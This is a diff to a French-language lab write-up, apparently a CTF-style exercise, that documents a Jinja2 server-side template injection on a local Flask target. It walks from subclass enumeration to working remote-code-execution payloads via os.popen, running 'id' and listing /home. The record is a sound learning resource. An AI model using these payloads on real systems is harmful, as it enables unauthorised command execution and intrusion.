@@ -357,9 +357,9 @@ Project under evaluation: 49
 - [x] Expression Mathematique.
 - [x] Expression Jinja2 simple
 - [x] Variables du ctx 
-- [ ] Objets Flask 
-- [ ] Objets Python
-- [ ] Acces aux classes / attributs
+- [x] Objets Flask 
+- [x] Objets Python
+- [x] Acces aux classes / attributs
 - [ ] Interaction systeme
 - [ ] RCE
 
@@ -468,3 +468,86 @@ Project under evaluation: _AppCtxGlobals
 -d "project_name={{ request.__class__.__name__ }}"
 Project under evaluation: Request
 ```
+
+##### Objets Python / Acces aux classes :  
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ ''.__class__.__mro__[1].__subclasses__() }}"
+```
+On cherche a voir ce qui peut etre atteint dans l'environnement  
+
+Output : [ici](./utils/dumps/dump.txt)
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ ''.__class__.__mro__[1].__subclasses__()|length }}"
+Project under evaluation: 541
+```  
+A ce stade, on peut determiner le chemin suivant :  
+```
+str
+ │
+ |── __mro__
+       │
+       |── object
+             │
+             |── __subclasses__()
+```
+Il va maintenant falloir examiner de plus pres le [dump](./utils/dumps/dump.txt) et determiner les classes a exploiter pour pouvoir passer a la suite :  
+
+```
+ <class 'itsdangerous.signer.SigningAlgorithm'>, ======> ???
+ <class 'itsdangerous.signer.Signer'>, ======> ???
+ <class 'itsdangerous._json._CompactJSON'>, ======> ???
+ <class 'flask.json.tag.JSONTag'>,
+ <class 'flask.json.tag.TaggedJSONSerializer'>,
+ <class 'flask.sessions.SessionInterface'>,
+ <class 'flask.sansio.blueprints.BlueprintSetupState'>,
+ <class 'subprocess.CompletedProcess'>,
+ <class 'subprocess.Popen'>  ======> ici
+```
+
+Popen est certainement la classe a exploiter ici : [Documentation Popen](https://docs.python.org/fr/3/library/subprocess.html)
+
+Commande pour exploiter :  
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \
+-H "X-Debug-Render: true" \
+-d "project_name={{ ''.__class__.__mro__[1].__subclasses__()[540].__init__.__globals__['os'].popen('id').read() }}"
+
+Project under evaluation: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+```
+Explication requete: 
+
+''.__class__   = str
+__mro[1]__     = object (permet de rechercher l'ordre des classes apr enumeration)
+__subclasses__ = Toutes les classes python
+[INDEX]        = 540 pour popen
+__init__       = fonction d'init du module
+__globals__    = dictionnaire global
+popen()        = processus systeme
+read()         = lit la sortie de popen()
+```
+
+Documentation utile pour aider a la comprehension : 
+1. [onsecurity.io](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)
+2. [HackTricks](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#recovering-class-object)
+3. [Jinja2 Templating](https://jinja.palletsprojects.com/en/stable/api/#jinja2.Template.render)  
+4. [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
+
+**La decouverte de fin de journee qui fait plaisir :**
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.2:5042/evaluate \                                                   
+-H "X-Debug-Render: true" \
+-d "project_name={{ ''.__class__.__mro__[1].__subclasses__()[540].__init__.__globals__['os'].popen('ls -lRa /home/').read() }}"
+Project under evaluation: /home/:
+```  
+Un joli rabbit hole a explorer demain avec les idees fraiches, de nouveaux indices, des fichiers etc ... :D
